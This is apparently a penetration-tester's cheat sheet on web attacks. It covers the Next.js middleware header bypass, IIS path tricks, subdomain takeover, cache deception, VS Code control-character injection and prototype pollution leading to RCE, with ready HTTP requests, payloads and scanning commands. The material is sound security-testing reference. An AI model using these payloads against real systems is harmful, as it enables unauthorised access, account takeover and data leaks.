# Miscellaneous Web Techniques

> Catch-all for techniques that don't fit a single class — framework-specific bugs, middleware bypass, path confusion, and emerging attack surfaces.

## Surface

- Next.js middleware — wildcard route matching, `x-middleware-subrequest` bypass
- IIS path normalization — trailing dots, semicolons, Unicode in path segments
- WebSocket upgrade paths — HTTP-level attacks before protocol switch
- Terminal emulator / IDE integrations — control character injection
- Agentic workflows with tool-call APIs — IDOR + privilege escalation in agent-facing endpoints
- Subdomain takeover — dangling DNS CNAME to unclaimed SaaS service
- Cache deception — public cache stores authenticated responses via path suffix tricks

## Next.js Middleware Bypass

CVE-2025-29927 class: middleware execution skipped via malformed path or internal header.

```
# Test x-middleware-subrequest header (CVE-2025-29927)
GET /admin/users HTTP/1.1
Host: target.com
x-middleware-subrequest: 1

# Path normalization bypass
GET /app/middleware/../admin HTTP/1.1
GET /api/auth/protected%2F..%2Fadmin HTTP/1.1
```

Affected pattern: `middleware.ts` with wildcard matcher `[...slug]` or insufficient path checks.

## IIS / Sitecore Auth Bypass

IIS auth bypass via unusual path segments:

```
# Trailing dot (IIS maps /path. to /path)
GET /admin. HTTP/1.1

# Semicolon path injection
GET /admin;test/ HTTP/1.1

# Case normalization (IIS case-insensitive)
GET /ADMIN/ HTTP/1.1
GET /%61dmin/ HTTP/1.1
```

Sitecore 9.3: multiple RCE vectors and auth bypasses via IIS integration — prioritize if you see `/sitecore/` paths.

## Subdomain Takeover

```bash
# Enumerate dangling CNAMEs
subfinder -d target.com -silent | httpx -silent -status-code | grep 404
# Cross-reference with known takeover-able services
subjack -w subdomains.txt -t 100 -ssl -o results.txt
nuclei -t takeovers/ -l subdomains.txt
```

High-value targets: Fastly, GitHub Pages, Heroku, Azure (azurewebsites.net), AWS (s3, elasticbeanstalk).

## Web Cache Deception

Force cache to store authenticated response at a public-facing path:

```
# Append cacheable suffix — proxy caches it, next visitor gets your data
GET /account/profile/nonexistent.css HTTP/1.1
GET /api/user/me/..%2Fstatic.js HTTP/1.1
```

Confirm: fetch URL unauthenticated from different IP — if you get the victim's data, it's cached.

## Control Character Injection (Terminals/IDEs)

ASCII control sequences in filenames or file content reach terminal emulators:

```
# SOH, STX, EOT in filenames execute in VS Code integrated terminal
echo -e "\x01id\x0a" > "$(printf '\001id\012')"

# Check: does app strip control chars before passing to shell/terminal?
# Test with filename: test\x00.txt, test\x01.txt
```

## Prototype Pollution → RCE

Node.js gadget chains via prototype pollution in merge/clone operations:

```javascript
// Pollute via JSON param
{"__proto__": {"polluted": "yes"}}
{"constructor": {"prototype": {"polluted": "yes"}}}

// RCE via child_process gadget (specific framework versions)
{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ"}}
```

Scan with: `ppmap` — automated prototype pollution scanner.

## Tools

- **nuclei** — misc CVE templates, subdomain takeover, middleware bypass: `nuclei -t misc/ -t takeovers/ -u https://target.com`
- **subjack** — subdomain takeover checker
- **ppmap** — prototype pollution scanner
- **cariddi** — crawl + endpoint discovery for misc vulns

## Chain Opportunities

- **Subdomain takeover → CSP bypass** — control subdomain whitelisted in CSP, host XSS payload
- **Cache deception → PII leak** — authenticated profile data cached and served to anyone with URL
- **Next.js middleware bypass → auth bypass → IDOR → ATO** — skip auth middleware, access any user object
- **Prototype pollution → RCE** — polluted property reaches `child_process.spawn` or `eval`
- **Control char injection → RCE** — terminal processes injected control sequences as commands

## Recent Intel

- **CVE-2025-29927** · Next.js middleware bypass via `x-middleware-subrequest` header or path normalization — affected versions 13-15 with wildcard matchers · https://www.assetnote.io/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927
- **VS Code control character RCE** · ASCII SOH/STX/EOT in filenames or drag-and-drop content triggers terminal command execution — drag-and-pwnd technique, stealthy injection bypassing printable-char filters · https://portswigger.net/research/drag-and-pwnd-leverage-ascii-characters-to-exploit-vs-code
- **Sitecore 9.3 IIS bypass** · Three distinct RCE vectors + two auth bypasses via IIS authorization integration — check `/sitecore/shell/` and `/sitecore/admin/` paths for exposed management handlers · https://www.assetnote.io/resources/research/bypass-iis-authorisation-with-this-one-weird-trick-three-rces-and-two-auth-bypasses-in-sitecore-9-3
